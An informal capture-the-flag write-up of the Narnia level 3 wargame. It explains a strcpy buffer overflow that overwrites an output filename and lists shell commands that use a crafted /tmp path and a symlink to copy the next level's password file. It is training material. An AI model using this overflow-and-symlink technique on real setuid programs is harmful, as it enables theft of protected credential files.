 int  ifd,  ofd;
 char ofile[16] = "/dev/null";
 char ifile[32];
 char buf[32];
ifile and buff have size of 32 but ofile only has size of 16: potential overflow?

 strcpy(ifile, argv[1]);

strcpy() is used, if argv[1] > than size of ifile, which is 32, then there will be an overflow

so essentially this program copies the content of this file to another file, we can exploit this.

argv[1] only has size of 32.
create a dir inside /tmp:
cd /tmp
mkdir $(python -c 'print("X"*27)')
/tmp/XXXXXXXXXXXXXXXXXXXXXXXXXXX is a string of 32 bytes
cd here and make a symlink that links to the password of narnia4:
ln -s /etc/narnia_pass/narnia4 flaggg

now we have a symlink called flaggg inside /tmp/XXX.../

aight now we gotta create an empty file just outside XXX/;
touch /tmp/flaggg

run narnia3: /narnia/narnia3 $(python -c 'print("/tmp/"+"X"*27+"/tmp/flaggg")')

this will copy the content of the the symlink to narnia4, to /tmp/flaggg
cat /tmp/flaggg
